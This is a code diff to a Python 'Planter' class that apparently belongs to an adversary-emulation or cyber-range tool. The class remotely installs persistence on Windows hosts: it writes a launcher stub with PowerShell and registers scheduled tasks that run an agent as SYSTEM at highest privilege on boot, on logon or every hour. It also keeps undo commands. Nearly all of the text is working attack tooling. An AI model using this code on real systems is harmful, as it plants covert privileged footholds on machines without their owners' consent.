@@ -369,37 +369,42 @@ class Planter:
             ip, fh, f'tasklist /FI "IMAGENAME eq {image}"', timeout=60)
         return image.lower() in (out or "").lower()
 
-    def _mech_task(self, ip, fh, drawn, remote, guard=None, *, trigger):
+    def _mech_task(self, ip, fh, drawn, remote, guard=None, *, trigger,
+                   mo=None, st=None):
         task = drawn["task"]
-        script = (f'schtasks /Create /TN "{task}" /TR "{remote}" /SC {trigger} '
-                  f'/RU SYSTEM /RL HIGHEST /F'
+        # A bare /TR starts another copy every time a plant re-registers, and the
+        # live range proved it: ten live copies of one agent on each Windows box,
+        # which is noise rather than persistence. The task runs a stub that
+        # checks for the image first, so all the surfaces coalesce on one
+        # process. (The stub is a file because schtasks mangles a piped /TR.)
+        stub = remote.rsplit("\\", 1)[0] + "\\" + task.replace(" ", "") + "-run.cmd"
+        body = guard[len("cmd /c "):] if guard else f'start "" /b "{remote}"'
+        self._win_ps(ip, fh, f"Set-Content -LiteralPath '{stub}' -Value '{body}' "
+                             f"-Encoding ascii", timeout=90)
+        script = (f'schtasks /Create /TN "{task}" /TR "cmd /c {stub}" /SC {trigger}'
+                  + (f" /MO {mo}" if mo else "")
+                  + (f" /ST {st}" if st else "")
+                  + ' /RU SYSTEM /RL HIGHEST /F'
                   + (' && schtasks /Run /TN "' + task + '"' if trigger == "ONSTART" else ""))
         rc, out, err = self._win(ip, fh, script, timeout=180)
-        return {"detail": f"task {task} ({trigger}) rc={rc}",
-                "paths": [f"task:{task}"],
+        return {"detail": f"task {task} ({trigger}{'/' + mo if mo else ''}) rc={rc}",
+                "paths": [f"task:{task}", stub],
                 "undo": [f'schtasks /End /TN "{task}"',
-                         f'schtasks /Delete /TN "{task}" /F']}
+                         f'schtasks /Delete /TN "{task}" /F',
+                         f"Remove-Item -Path '{stub}' -Force"]}
 
-    # A task's /TR is the bare exe path (schtasks mangles a piped command line),
-    # so the task builders take `guard` for signature parity and do not use it.
     def _mech_task_onstart(self, ip, fh, drawn, remote, guard):
-        return self._mech_task(ip, fh, drawn, remote, trigger="ONSTART")
+        return self._mech_task(ip, fh, drawn, remote, guard, trigger="ONSTART")
 
     def _mech_task_onlogon(self, ip, fh, drawn, remote, guard):
-        return self._mech_task(ip, fh, drawn, remote, trigger="ONLOGON")
+        return self._mech_task(ip, fh, drawn, remote, guard, trigger="ONLOGON")
 
     def _mech_task_daily(self, ip, fh, drawn, remote, guard):
         # A recurring trigger with a random minute: the agent comes back every
         # hour without a boot and without a logon.
         minute = self.ctx.rng.randrange(1, 60)
-        task = drawn["task"]
-        script = (f'schtasks /Create /TN "{task}" /TR "{remote}" /SC MINUTE /MO 60 '
-                  f'/ST 00:{minute:02d} /RU SYSTEM /RL HIGHEST /F')
-        rc, out, err = self._win(ip, fh, script, timeout=180)
-        return {"detail": f"task {task} (MINUTE/60) rc={rc}",
-                "paths": [f"task:{task}"],
-                "undo": [f'schtasks /End /TN "{task}"',
-                         f'schtasks /Delete /TN "{task}" /F']}
+        return self._mech_task(ip, fh, drawn, remote, guard, trigger="MINUTE",
+                               mo="60", st=f"00:{minute:02d}")
 
     def _mech_service(self, ip, fh, drawn, remote, guard):
         # A console agent cannot be an SCM service (1053), so the service runs a
